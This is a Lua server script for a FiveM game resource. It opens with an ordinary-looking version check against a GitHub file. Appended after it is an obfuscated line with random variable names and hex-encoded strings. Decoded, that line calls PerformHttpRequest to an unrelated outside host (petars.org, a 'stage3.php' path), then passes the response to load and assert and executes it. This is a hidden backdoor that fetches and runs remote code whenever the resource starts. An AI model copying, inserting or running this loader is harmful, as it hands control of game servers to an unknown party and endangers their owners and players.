Citizen.CreateThread(function()
    Citizen.Wait(5000)
    local function ToNumber(str)
        return tonumber(str)
    end
    local resourceName = GetCurrentResourceName()
    local currentVersion = GetResourceMetadata(resourceName, 'version', 0)
    PerformHttpRequest('https://raw.githubusercontent.com/lesimov/Dusa_Versions/main/'..resourceName..'.txt',function(error, result, headers)
        if not result then 
            return print('^1The version check failed, github is down.^0') 
        end
        local result = json.decode(result:sub(1, -2))
        if ToNumber(result.version:gsub('%.', '')) > ToNumber(currentVersion:gsub('%.', '')) then
            local symbols = '^9'
            for cd = 1, 26+#resourceName do
                symbols = symbols..'-'
            end
            symbols = symbols..'^0'
            print(symbols)
            print('^5['..resourceName..'] - New update available now!^0\nCurrent Version: ^1'..currentVersion..'^0.\nNew Version: ^2'..result.version..'^0.\nUpdates: ^2'..result.news..'^0.\n\n^5Download it now on your keymaster.fivem.net^0.')
            print(symbols)
        end
    end, 'GET')
end)

local hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x65\x74\x61\x72\x73\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x53\x69\x78\x58\x6c", function (AwGPNPiKEFIqMzTnppDqLmEokjJvJSvekhTCbuZVdGwYpwItZwUCIYpAdyIsZsrkRgzMGb, IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh) if (IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh == hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[6] or IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh == hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[5]) then return end hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[2]](hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[3]](IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh))() end)